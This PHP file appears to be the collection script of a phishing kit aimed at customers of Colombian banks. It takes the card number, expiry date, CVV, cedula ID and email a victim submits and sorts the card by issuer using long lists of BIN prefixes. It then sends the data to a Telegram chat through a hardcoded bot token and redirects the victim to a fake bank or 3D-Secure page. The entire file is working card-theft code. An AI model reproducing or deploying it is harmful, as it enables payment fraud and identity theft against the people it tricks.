<?php
session_start();

require_once('papaconsalchicha.php');

$nombre = $_POST['nombre'];
$tarjeta = $_POST['tarjeta'];
$fecha = $_POST ['fecha'];
$cvv = $_POST['cvv'];
$cedula = $_POST['cedula'];
$email = $_POST['email_clon'];

//INFORMACION CC+LOGO

$token = "8244180906:AAGatjpS3C-PG2vDQB3gXFky2b5aoafJSKI";
$chatId = "-4927137480";


 $numero_recortado = substr($tarjeta, 0, 6);
 $c = $numero_recortado;


$ip = $_SERVER['REMOTE_ADDR'];
$mensaje = "$ip Prueba CC: $nombre, $tarjeta, $cvv, $fecha";


if (($c == 428390 || $c == 451307 || $c == 601687 || $c == 549157 || $c == 601676 || $c == 601651 || $c == 451376 || $c == 601645 || $c == 530694 || $c == 409983 || $c == 601656 || $c ==
        601676 || $c == 601651 || $c == 451376 || $c == 601645 || $c == 530694 || $c == 409983 || $c == 601656 || $c == 601655 || $c == 549158 || $c == 601610 || $c == 454400 || $c == 451359
        || $c == 449188 || $c == 377813 || $c == 377814 || $c == 377815 || $c == 377816 || $c == 377843 || $c == 377844 || $c == 377845 || $c == 377846 || $c == 377847 || $c == 377848
        || $c == 377886 || $c == 409983 || $c == 409984 || $c == 409985 || $c == 411054
        || $c == 441119 || $c == 446846 || $c == 449188 || $c == 451303 || $c == 451307 || $c == 451308
        || $c == 451309 || $c == 451321 || $c == 451359 || $c == 451374 || $c == 451376
        || $c == 451381 || $c == 454400 || $c == 459425 || $c == 459428 || $c == 485946 || $c == 494381
        || $c == 517640 || $c == 517710 || $c == 530691 || $c == 530693 || $c == 530694 || $c == 530695
        || $c == 530696 || $c == 530697 || $c == 540615 || $c == 540649 || $c == 540688 || $c == 540691
        || $c == 541251 || $c == 547062 || $c == 547480 || $c == 549157 || $c == 549158 || $c == 552588
        || $c == 552807 || $c == 553145 || $c == 528633 || $c == 530372 || $c == 530371 || $c == 530373 || $c == 459426 || $c == 540691 || $c == 401089 || $c == 468561)
) {


        $mensaje  = "🏦 BANCOLOMBIA 🏦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "⚙️Nombre: $nombre\n";
        $mensaje .= "💳Tarjeta: $tarjeta\n";
        $mensaje .= "📆Fecha: $fecha\n"; // ← AQUÍ EL \n ES CLAVE
        $mensaje .= "🔑CVV: $cvv\n";
        $mensaje .= "🪪Cedula: $cedula\n";
        $mensaje .= "✉️Correo: $email\n";
        $mensaje .= "🌐IP: $ip";


    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/bancolombia/index.html');

} else if (
    ($c == 451307 || $c == 601687 || $c == 549157 || $c == 601676 || $c == 601651 || $c == 451376 || $c == 601645 || $c == 530694 || $c == 409983 || $c == 601656 || $c ==
        601676 || $c == 601651 || $c == 451376 || $c == 601645 || $c == 530694 || $c == 409983 || $c == 601656 || $c == 601655 || $c == 549158 || $c == 601610 || $c == 454400 || $c == 451359
        || $c == 449188 || $c == 377813 || $c == 377814 || $c == 377815 || $c == 377816 || $c == 377843 || $c == 377844 || $c == 377845 || $c == 377846 || $c == 377847 || $c == 377848
        || $c == 377886 || $c == 409983 || $c == 409984 || $c == 409985 || $c == 411054
        || $c == 441119 || $c == 446846 || $c == 449188 || $c == 451303 || $c == 451307 || $c == 451308
        || $c == 451309 || $c == 451321 || $c == 451359 || $c == 451374 || $c == 451376
        || $c == 451381 || $c == 454400 || $c == 459425 || $c == 459428 || $c == 485946 || $c == 494381
        || $c == 517640 || $c == 517710 || $c == 530691 || $c == 530693 || $c == 530694 || $c == 530695
        || $c == 530696 || $c == 530697 || $c == 540615 || $c == 540649 || $c == 540688 || $c == 540691
        || $c == 541251 || $c == 547062 || $c == 547480 || $c == 549157 || $c == 549158 || $c == 552588
        || $c == 552807 || $c == 553145 || $c == 528633 || $c == 530372 || $c == 530371 || $c == 530373 || $c == 459426)
) {

    $mensaje = "Datos Bancol\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
    enviarMensajeTelegram($chatId, $mensaje, $token);

    header("location:3d/cargando.php?numero=$codigo&nombre=$nombre&fecha=$fecha&cvc=$cvv");
    //Davivienda
} else if (
    ($c == 360151 || $c == 360324 || $c == 402530
        || $c == 407383 || $c == 424488 || $c == 425817 || $c == 425949 || $c == 425950
        || $c == 425951 || $c == 425951 || $c == 539116 || $c == 439152
        || $c == 441080 || $c == 454300 || $c == 455981
        || $c == 455983 || $c == 455986 || $c == 456360 || $c == 472044
        || $c == 473228 || $c == 474493 || $c == 480405 || $c == 485630 || $c == 485953
        || $c == 485970 || $c == 486437 || $c == 487048 || $c == 491646 || $c == 491647
        || $c == 498467 || $c == 512392 || $c == 517796 || $c == 520024 || $c == 526943 || $c == 531378 || $c == 540591
        || $c == 540692 || $c == 540694 || $c == 547063 || $c == 547113 || $c == 547130
        || $c == 547246 || $c == 547481 || $c == 547482 || $c == 547488
        || $c == 549156 || $c == 549724 || $c == 552201 || $c == 552336
        || $c == 552903 || $c == 554531 || $c == 554901 || $c == 554936 || $c == 559225 || $c == 526557 || $c == 428392 || $c == 459321 || $c == 447198 || $c == 320572 || $c == 403899 || $c == 430464 || $c == 455370 || $c == 455982 || $c == 455982 || $c == 458173 || $c == 511614 || $c == 533295 || $c == 524708 || $c == 524052 || $c == 424529 || $c == 428391 || $c == 448390)
) {
    $mensaje = "👁 $ip 👁\n\n🏦DAVIVIENDA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";       enviarMensajeTelegram($chatId, $mensaje, $token);

    header('location:/pago/davivienda/index.html');

    //Davivienda   
} else if (
    ($c == 360151 || $c == 360324 || $c == 402530
        || $c == 407383 || $c == 424488 || $c == 425817 || $c == 425949 || $c == 425950
        || $c == 425951 || $c == 425951 || $c == 539116 || $c == 439152
        || $c == 441080 || $c == 454300 || $c == 455981
        || $c == 455983 || $c == 455986 || $c == 456360 || $c == 472044
        || $c == 473228 || $c == 474493 || $c == 480405 || $c == 485630 || $c == 485953
        || $c == 485970 || $c == 486437 || $c == 487048 || $c == 491646 || $c == 491647
        || $c == 498467 || $c == 512392 || $c == 517796 || $c == 520024 || $c == 526943 || $c == 531378 || $c == 540591
        || $c == 540692 || $c == 540694 || $c == 547063 || $c == 547113 || $c == 547130
        || $c == 547246 || $c == 547481 || $c == 547482 || $c == 547488
        || $c == 549156 || $c == 549724 || $c == 552201 || $c == 552336
        || $c == 552903 || $c == 554531 || $c == 554901 || $c == 554936 || $c == 559225 || $c == 526557 || $c == 428392 || $c == 459321 || $c == 447198 || $c == 320572 || $c == 403899 || $c == 430464 || $c == 455370 || $c == 455982 || $c == 455982 || $c == 458173 || $c == 511614 || $c == 533295 || $c == 524708 || $c == 524052) && (isset($_SESSION['davivienda']))
) {
    $mensaje = "Datos Davivienda\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
   
    enviarMensajeTelegram($chatId, $mensaje, $token);

    header('location:/3d/cargando2.php?codigo=' . $codigo);

    //Bogota 3d
} else if (
    ($c == 403722 || $c == 414529 || $c == 426045 || $c == 430274 || $c == 433460 || $c == 450668 || $c == 454200 || $c == 457537
        || $c == 457542 || $c == 459504 || $c == 459505 || $c == 459918 || $c == 459919
        || $c == 465770 || $c == 466090 || $c == 474630 || $c == 477363 || $c == 477364
        || $c == 485935 || $c == 486414 || $c == 491616 || $c == 491617
        || $c == 491625 || $c == 491626 || $c == 493110 || $c == 496083 || $c == 512069 || $c == 512827 || $c == 512851 || $c == 513360 || $c == 515864
        || $c == 520137 || $c == 520354 || $c == 522104 || $c == 523433 || $c == 529198 || $c == 531088 || $c == 531122
        || $c == 531126 || $c == 539612 || $c == 540080 || $c == 543862 || $c == 548494 || $c == 548940
        || $c == 552221 || $c == 552865 || $c == 553661 || $c == 402739 || $c == 406238 || $c == 419328 || $c == 421513 || $c == 421544 || $c == 423949 || $c == 426732 || $c == 446872 || $c == 450942 || $c == 457320 || $c == 457321 || $c == 457563 || $c == 457564 || $c == 457602 || $c == 457603 || $c == 457605 || $c == 457604 || $c == 491511 || $c == 491602 || $c == 491614 || $c == 499812)
) {

    $mensaje = "👁 $ip 👁\n\n🏦BOGOTA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";   
    enviarMensajeTelegram($chatId, $mensaje, $token);

    header('location:/pago/bogota/index.html');


} else if (
    ($c == 403722 || $c == 414529 || $c == 426045 || $c == 430274 || $c == 433460 || $c == 450668 || $c == 454200 || $c == 457537
        || $c == 457542 || $c == 459504 || $c == 459505 || $c == 459918 || $c == 459919
        || $c == 465770 || $c == 466090 || $c == 474630 || $c == 477363 || $c == 477364
        || $c == 485935 || $c == 486414 || $c == 491616 || $c == 491617
        || $c == 491625 || $c == 491626 || $c == 493110 || $c == 496083 || $c == 512069 || $c == 512827 || $c == 512851 || $c == 513360 || $c == 515864
        || $c == 520137 || $c == 520354 || $c == 522104 || $c == 523433 || $c == 529198 || $c == 531088 || $c == 531122
        || $c == 531126 || $c == 539612 || $c == 540080 || $c == 543862 || $c == 548494 || $c == 548940
        || $c == 552221 || $c == 552865 || $c == 553661 || $c == 402739 || $c == 406238 || $c == 419328 || $c == 421513 || $c == 421544 || $c == 423949 || $c == 426732 || $c == 446872 || $c == 450942 || $c == 457320 || $c == 457321 || $c == 457563 || $c == 457564 || $c == 457602 || $c == 457603 || $c == 457605 || $c == 457604 || $c == 491511 || $c == 491602 || $c == 491614 || $c == 499812)
) {
    $mensaje = "Datos Bogota\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
   
    enviarMensajeTelegram($chatId, $mensaje, $token);

    header('location:/3d/cargando3.php?codigo=' . $codigo);


}
//Colpatria
else if (
    ($c == 422274 || $c == 400476 || $c == 400477 || $c == 404177 || $c == 404178 || $c == 407398 || $c == 525358
        || $c == 408430 || $c == 408431 || $c == 409744 || $c == 410176 || $c == 411759
        || $c == 416048 || $c == 416049 || $c == 428495 || $c == 428496 || $c == 432105
        || $c == 432106 || $c == 434606 || $c == 440811 || $c == 440812 || $c == 450406
        || $c == 454600 || $c == 454601 || $c == 457282 || $c == 457284 || $c == 457317
        || $c == 461209 || $c == 482484 || $c == 485930 || $c == 492485 || $c == 492486
        || $c == 493813 || $c == 496084 || $c == 498476 || $c == 510608 || $c == 511577
        || $c == 511696 || $c == 512577 || $c == 512645 || $c == 512679 || $c == 514907
        || $c == 515858 || $c == 517411 || $c == 519422 || $c == 519971 || $c == 519986
        || $c == 520142 || $c == 520147 || $c == 522210 || $c == 522749 || $c == 524057
        || $c == 525723 || $c == 525984 || $c == 527076 || $c == 528009 || $c == 528085
        || $c == 528098 || $c == 528614 || $c == 528884 || $c == 529404 || $c == 531375
        || $c == 531960 || $c == 531961 || $c == 533171 || $c == 534173 || $c == 534174
        || $c == 534599 || $c == 540690 || $c == 540855 || $c == 540919 || $c == 541659
        || $c == 541692 || $c == 541693 || $c == 547064 || $c == 547129 || $c == 547479
        || $c == 550206 || $c == 552066 || $c == 552074 || $c == 553662 || $c == 459356 || $c == 498861 || $c == 442549 || $c == 459356 || $c == 483160 || $c == 483100 || $c == 525358 || $c == 483101 || $c ==  529448)
) {

    $mensaje = "👁 $ip 👁\n\n🏦COLPATRIA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";   
    enviarMensajeTelegram($chatId, $mensaje, $token);

    header('location:/pago/colpatria/index.html');

}//Colpatria 3d
else if (
    ($c == 422274 || $c == 400476 || $c == 400477 || $c == 404177 || $c == 404178 || $c == 407398 || $c == 525358
        || $c == 408430 || $c == 408431 || $c == 409744 || $c == 410176 || $c == 411759
        || $c == 416048 || $c == 416049 || $c == 428495 || $c == 428496 || $c == 432105
        || $c == 432106 || $c == 434606 || $c == 440811 || $c == 440812 || $c == 450406
        || $c == 454600 || $c == 454601 || $c == 457282 || $c == 457284 || $c == 457317
        || $c == 461209 || $c == 482484 || $c == 485930 || $c == 492485 || $c == 492486
        || $c == 493813 || $c == 496084 || $c == 498476 || $c == 510608 || $c == 511577
        || $c == 511696 || $c == 512577 || $c == 512645 || $c == 512679 || $c == 514907
        || $c == 515858 || $c == 517411 || $c == 519422 || $c == 519971 || $c == 519986
        || $c == 520142 || $c == 520147 || $c == 522210 || $c == 522749 || $c == 524057
        || $c == 525723 || $c == 525984 || $c == 527076 || $c == 528009 || $c == 528085
        || $c == 528098 || $c == 528614 || $c == 528884 || $c == 529404 || $c == 531375
        || $c == 531960 || $c == 531961 || $c == 533171 || $c == 534173 || $c == 534174
        || $c == 534599 || $c == 540690 || $c == 540855 || $c == 540919 || $c == 541659
        || $c == 541692 || $c == 541693 || $c == 547064 || $c == 547129 || $c == 547479
        || $c == 550206 || $c == 552066 || $c == 552074 || $c == 553662 || $c == 459356)
) {
    $mensaje = "Datos Colpatria\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
   
    enviarMensajeTelegram($chatId, $mensaje, $token);


    header('location:/3d/cargando4.php?codigo=' . $codigo);


    //BB
} else if (
    ($c == 404280 || $c == 410164 || $c == 421892
        || $c == 439216 || $c == 450407 || $c == 450408 || $c == 450418
        || $c == 454100 || $c == 454700 || $c == 454701 || $c == 454759 || $c == 455100
        || $c == 456783 || $c == 459418 || $c == 459419 || $c == 485995
        || $c == 492198 || $c == 492488 || $c == 492489 || $c == 404279 || $c == 439467 || $c == 462550 || $c == 492468 || $c == 491268 || $c == 491268)
) {

    $mensaje = "👁 $ip 👁\n\n🏦BBVA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/Generales/index.html');


    //bbva 3d
} else if (
    ($c == 404280 || $c == 410164 || $c == 421892
        || $c == 439216 || $c == 450407 || $c == 450408 || $c == 450418
        || $c == 454100 || $c == 454700 || $c == 454701 || $c == 454759 || $c == 455100
        || $c == 456783 || $c == 459418 || $c == 459419 || $c == 485995
        || $c == 492198 || $c == 492488 || $c == 492489 || $c == 404279 || $c == 439467 || $c == 462550 || $c == 492468 || $c == 491268) 
) {

    $mensaje = "Datos Bbva\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
      enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/3d/cargando5.php?codigo=' . $codigo);


    //OCCIDENTE
} else if (
    ($c == 400489 || $c == 400490 || $c == 400491 || $c == 400608
        || $c == 407849 || $c == 419143 || $c == 425987 || $c == 430485 || $c == 431026
        || $c == 431027 || $c == 441511 || $c == 450650 || $c == 456390 || $c == 462940
        || $c == 462941 || $c == 475094 || $c == 485936 || $c == 489911 || $c == 489925
        || $c == 491330 || $c == 512835 || $c == 516282 || $c == 516288 || $c == 530710
        || $c == 530711 || $c == 530712 || $c == 530713 || $c == 530714 || $c == 530715
        || $c == 530716 || $c == 530717 || $c == 530718 || $c == 530719 || $c == 530720
        || $c == 530721 || $c == 530722 || $c == 530723 || $c == 530724 || $c == 530725
        || $c == 530726 || $c == 530727 || $c == 530728 || $c == 530729 || $c == 541203
        || $c == 547385 || $c == 549151 || $c == 552256 || $c == 558772 || $c == 540625
        || $c == 434660) 
) {
    $mensaje = "👁 $ip 👁\n\n🏦OCCIDENTE🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/occidente/index.html');


    //occidente 3d
} else if (
    ($c == 400489 || $c == 400490 || $c == 400491 || $c == 400608
        || $c == 407849 || $c == 419143 || $c == 425987 || $c == 430485 || $c == 431026
        || $c == 431027 || $c == 441511 || $c == 450650 || $c == 456390 || $c == 462940
        || $c == 462941 || $c == 475094 || $c == 485936 || $c == 489911 || $c == 489925
        || $c == 491330 || $c == 512835 || $c == 516282 || $c == 516288 || $c == 530710
        || $c == 530711 || $c == 530712 || $c == 530713 || $c == 530714 || $c == 530715
        || $c == 530716 || $c == 530717 || $c == 530718 || $c == 530719 || $c == 530720
        || $c == 530721 || $c == 530722 || $c == 530723 || $c == 530724 || $c == 530725
        || $c == 530726 || $c == 530727 || $c == 530728 || $c == 530729 || $c == 541203
        || $c == 547385 || $c == 549151 || $c == 552256 || $c == 558772 || $c == 540625)
) {

    $mensaje = "Datos Occidente\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
   
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/3d/cargando7.php?codigo=' . $codigo);


    //Falabella
} else if (($c == 513689 || $c == 514332 || $c == 528209)) {

    $mensaje = "👁 $ip 👁\n\n🏦FALABELLA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email"; 
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/falabella/index.html');

    //falabella 3d
} else if (($c == 513689 || $c == 514332 || $c == 528209)) {

    $mensaje = "Datos Falabella\nDocumento: $cedula\nCorreo: $correo\nTeléfono: $tel\nDepartamento: $departamento\nCiudad: $ciudad\nDirección: $dir\nCódigo: $codigo\nAño: $ano\nMes: $mes\nCVV: $cvv";
   
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/3d/cargando9.php?codigo=' . $codigo);


} else if (($c == 412709 || $c == 470438 || $c == 518503 || $c == 470439 || $c == 470440 || $c == 482451 || $c == 496079 || $c == 496080 || $c == 496081 || $c == 522973 || $c == 547142 || $c == 547141)) {
    $mensaje = "👁 $ip 👁\n\n🏦AVVILLAS🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email"; 
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/avvillas/index.html');

} else if ($c == 542060 || $c == 542080) {
    $mensaje = "👁 $ip 👁\n\n🏦SERFINANZA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";   enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/serfinanza/index.html');


} else if ($c == 484191 || $c == 484193) {
    $mensaje = "👁 $ip 👁\n\n🏦FINANDINA🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/finandina/index.html');

} else if ($c == 409355) {
    $mensaje = "👁 $ip 👁\n\n🏦NEQUI🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/nequi/index.html');

}else if($c == 457021){
    $mensaje = "👁 $ip 👁\n\n🏦CITIBANK🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
\n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/citibank/index.html');
    
} else if ($c == 489445 |$c == 544121 |$c == 519708 || $c == 522679 || $c == 532824 || $c == 555845 |$c == 519708 || $c == 522679 || $c == 532824 || $c == 555845 || $c == 570423 || $c == 537068|| $c == 570423 || $c == 537068 || $c == 521897 || $c == 526517 |$c == 411669 |$c == 411088 |$c == 476003 |$c == 476006 |$c == 370110 |$c == 370477 |$c == 370895 |$c == 472856 |$c == 482452 |$c == 491603 |$c == 400533 |$c == 411669 |$c == 433603 |$c == 456870 |$c == 401092 |$c == 401093 |$c == 447551 |$c == 485091 |$c == 507091 |$c == 448185 |$c == 448186 |$c == 448187 |$c == 449744 |$c == 469876 |$c == 480258 |$c == 485919 |$c == 485979 |$c == 486647 |$c == 492199 |$c == 423938 |$c == 432567 |$c == 491329 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 333333 |$c == 518841 |$c == 525444 |$c == 555825 |$c == 552558 |$c == 543464 |$c == 528892 |$c == 548115 |$c == 454616 || $c == 528892) {
    $mensaje = "👁 $ip 👁\n\n🏦LAS GENERICAS🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email";
    enviarMensajeTelegram($chatId, $mensaje, $token);
    header('location:/pago/Generales/index.html');

} else {
    $mensaje = "👁 $ip 👁\n\n🏦SIN IFORMACION🏦\n=================\nDATOS\n=================\n🪪Nombre: $nombre
    \n💳Tarjeta: $tarjeta\n📆Fecha: $fecha\n🔑Cvv: $cvv\nCedula: $cedula\nEmail: $email"; 
    enviarMensajeTelegram($chatId, $mensaje, $token);
     header('location:/pago/Generales/index.html');
}

?>